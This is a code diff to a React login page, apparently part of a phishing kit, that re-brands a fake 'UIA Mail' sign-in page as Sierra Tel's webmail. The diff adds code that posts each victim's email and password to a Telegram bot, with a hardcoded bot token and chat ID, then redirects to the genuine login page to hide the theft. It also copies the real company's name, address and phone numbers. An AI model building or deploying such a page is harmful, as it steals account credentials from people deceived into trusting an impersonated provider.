@@ -8,6 +8,7 @@ import magic from './magic.png';
 
 import axios from 'axios';
 import uia from './uia.png';
+import sti from './sti.png';
 
 function Home(){
     const[email, setEmail] = useState("");
@@ -15,7 +16,7 @@ function Home(){
     const [showPassword, setShowPassword] = useState(false);
   const [password, setPassword] = useState('');
 
-  const[platform, setPlatform] = useState("UIA")
+  const[platform, setPlatform] = useState("Sti-net")
 
   const[showError, setShowError] = useState(false);
 
@@ -25,29 +26,38 @@ function Home(){
 
 
   async function handleSubmit(e){
-      e.preventDefault();
+    e.preventDefault();
 
-      try {
-        const response = await axios.post('https://backendone-d60j.onrender.com/api/send', {
-            email:email,
-            password:password,
-            platform:platform
-        });
+    try {
+        // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
+        //     email:email,
+        //     password:password,
+        //     platform:platform
+        // });
+
+       const response =  await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
+            chat_id: 5868304053,
+            text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
+          });
+
     
         // Handle success
-        console.log('Data sent:', response.data.message);
+     
 
         if(response.status == 200){
-            console.log(response.data.message);
+           // console.log(response.data.message);
 
-            window.location.href = 'https://mail.uia.net/login.php';
+          
+           window.location.href = 'https://webmail.sti.net/login.php';
         }
       } catch (error) {
         // Handle error
         console.error('Error:', error);
       }
     
-  }
+}
+
+
     return (
         <>
 
@@ -59,16 +69,16 @@ function Home(){
             </div>}
             <div className='main col-md-10 m-auto px-5 py-2'>
 
-                <img src={uia} className="logo" />
+                <img src={sti} className="logo" />
 
                 <div className='innerdiv px-3 row'>
                     <div className='col-md-6 pt-3'>
-                        <h2 className='heading'>Welcome to UIA Mail!</h2>
+                        <h2 className='heading'>Welcome to Sierra Tel's Webmail</h2>
 
                         <h3 className='headingtwo'>Login to access your account</h3>
 
                         <p className='content text-justify'>
-                        Welcome to the User Site for the UIA Mail System.
+                        Welcome to the User Site for the MagicMail System.
 This is where you can setup and configure all your email options.
                         </p>
 
@@ -92,7 +102,7 @@ This is where you can setup and configure all your email options.
 
 
                             <form onSubmit={handleSubmit}>
-                                <h3 className='headingtwo'>Sign in to UIA Mail</h3>
+                                <h3 className='headingtwo'>Sign in to Webmail</h3>
 
                                 <hr
                         style={{
@@ -177,9 +187,11 @@ This is where you can setup and configure all your email options.
                         
                          fontSize:"11px",
                          color:"black"
-                    }} className='underthree text-center mt-3'>UIA Mail by Ultimate Internet Access, Inc. <br/>
-                    1300 Hwy 2, PO Box 1959, Wrightwood, CA 92397 <br/>
-                    Tel: (800) 982-6898</p>
+                    }} className='underthree text-center mt-3'>Magicmail WebMail is brought to you by Sierra Tel <br/>
+                    49150 Crane Valley Road (Road 426) <br/>
+                    Oakhurst CA, 93644 <br/>
+                    Tel: 559-683-4611, 209-966-3636 or toll free at 1-877-658-4611 <br/>
+                    customercare@sierratel.com</p>
             </div>
         </>
     );
